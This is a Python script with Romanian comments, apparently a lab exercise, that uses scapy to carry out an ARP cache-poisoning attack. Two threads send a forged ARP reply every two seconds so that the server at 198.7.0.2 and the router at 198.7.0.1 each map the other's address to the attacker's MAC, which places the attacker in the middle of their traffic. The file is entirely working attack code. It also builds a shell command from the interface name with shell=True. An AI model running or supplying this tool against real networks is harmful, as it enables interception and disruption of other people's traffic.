#!/usr/bin/env python3
from scapy.all import ARP, Ether, srp, send
import time
import threading
import logging

# Configurare logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        """
        Inițializare ARP Spoofer
        :param target_ip: IP-ul țintei (server sau router)
        :param gateway_ip: IP-ul gateway-ului (router sau server)
        :param interface: Interfața de rețea de pe care se trimit pachetele
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.attacker_mac = self.get_attacker_mac()
        
    def get_attacker_mac(self):
        """
        Obține adresa MAC a atacatorului
        :return: Adresa MAC a interfeței specificate
        """
        # Obținem adresa MAC a interfeței noastre
        # Folosim comanda ip link show pentru a obține informațiile despre interfață
        import subprocess
        result = subprocess.check_output(f"ip link show {self.interface}", shell=True).decode()
        # Extragem adresa MAC din output
        mac = result.split("link/ether ")[1].split(" ")[0]
        return mac

    def create_arp_packet(self, target_ip, gateway_ip):
        """
        Creează un pachet ARP falsificat
        :param target_ip: IP-ul țintei
        :param gateway_ip: IP-ul gateway-ului
        :return: Pachetul ARP creat
        """
        # Creăm un pachet ARP care spune că gateway-ul are adresa MAC a atacatorului
        arp_packet = ARP(
            op=2,  # 2 pentru ARP Reply
            pdst=target_ip,  # IP-ul țintei
            hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast MAC
            psrc=gateway_ip,  # IP-ul gateway-ului
            hwsrc=self.attacker_mac  # MAC-ul atacatorului
        )
        return arp_packet

    def poison_arp_cache(self):
        """
        Execută atacul de ARP spoofing
        """
        try:
            # Creăm pachetul ARP falsificat
            arp_packet = self.create_arp_packet(self.target_ip, self.gateway_ip)
            
            # Trimitem pachetul
            send(arp_packet, verbose=0)
            logging.info(f"ARP Spoofing: {self.gateway_ip} is-at {self.attacker_mac} -> {self.target_ip}")
            
        except Exception as e:
            logging.error(f"Eroare la trimiterea pachetului ARP: {e}")

def start_arp_spoofing():
    """
    Pornește atacul de ARP spoofing pentru ambele direcții
    """
    # Configurare pentru server
    server_spoofer = ARPSpoofer(
        target_ip="198.7.0.2",  # IP-ul serverului
        gateway_ip="198.7.0.1",  # IP-ul routerului
        interface="eth0"
    )
    
    # Configurare pentru router
    router_spoofer = ARPSpoofer(
        target_ip="198.7.0.1",  # IP-ul routerului
        gateway_ip="198.7.0.2",  # IP-ul serverului
        interface="eth0"
    )
    
    def poison_server():
        """
        Funcție pentru ARP spoofing către server
        """
        while True:
            server_spoofer.poison_arp_cache()
            time.sleep(2)  # Așteptăm 2 secunde între pachete
            
    def poison_router():
        """
        Funcție pentru ARP spoofing către router
        """
        while True:
            router_spoofer.poison_arp_cache()
            time.sleep(2)  # Așteptăm 2 secunde între pachete
    
    # Pornim două thread-uri pentru a executa atacul în paralel
    server_thread = threading.Thread(target=poison_server)
    router_thread = threading.Thread(target=poison_router)
    
    server_thread.daemon = True
    router_thread.daemon = True
    
    server_thread.start()
    router_thread.start()
    
    try:
        # Menținem programul activ
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Oprire atac ARP spoofing...")
        exit(0)

if __name__ == "__main__":
    logging.info("Pornire atac ARP spoofing...")
    start_arp_spoofing() 